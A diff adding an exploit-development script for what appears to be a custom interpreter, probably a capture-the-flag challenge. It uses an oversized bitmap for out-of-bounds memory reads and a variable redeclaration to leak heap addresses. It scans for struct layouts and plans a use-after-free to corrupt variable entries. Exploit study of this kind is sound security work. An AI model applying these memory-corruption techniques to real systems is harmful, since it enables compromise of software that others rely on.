@@ -1,0 +1,56 @@
+print("=== Find Bitmap Buffer Address ===");
+
+print("Step 1: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Leak heap address for reference");
+int leak1 = 0;
+string leak1 = "marker1";
+int heapmarker = leak1;
+print("Heap marker address:");
+print(heapmarker);
+
+print("Step 3: Scan for bitmap struct");
+print("Bitmap struct layout:");
+print("  offset 0x00: width (8 bytes)");
+print("  offset 0x08: height (8 bytes)");
+print("  offset 0x10: data_ptr (8 bytes)");
+print("Looking for width=INT64_MAX (9223372036854775807)");
+
+print("Scanning memory around heap marker...");
+int i = 0;
+int found = 0;
+while (i < 1000) {
+    int val1 = get(b1, i * 64 + 0, 0);
+    int val2 = get(b1, i * 64 + 8, 0);
+    int val3 = get(b1, i * 64 + 16, 0);
+    int val4 = get(b1, i * 64 + 24, 0);
+    int val5 = get(b1, i * 64 + 32, 0);
+    int val6 = get(b1, i * 64 + 40, 0);
+    int val7 = get(b1, i * 64 + 48, 0);
+    int val8 = get(b1, i * 64 + 56, 0);
+    
+    if (val1 != 0 || val2 != 0 || val3 != 0 || val4 != 0 || val5 != 0 || val6 != 0 || val7 != 0 || val8 != 0) {
+        print("Found non-zero data at offset:");
+        print(i);
+        print("Values:");
+        print(val1);
+        print(val2);
+        print(val3);
+        print(val4);
+        print(val5);
+        print(val6);
+        print(val7);
+        print(val8);
+        found = 1;
+    }
+    i = i + 1;
+}
+
+if (found == 0) {
+    print("No bitmap struct found in scanned range");
+    print("Try different scan range or use use-after-free approach");
+}
+
+print("Step 4: Alternative - use use-after-free");
+print("Create UAF to directly corrupt variable entry");
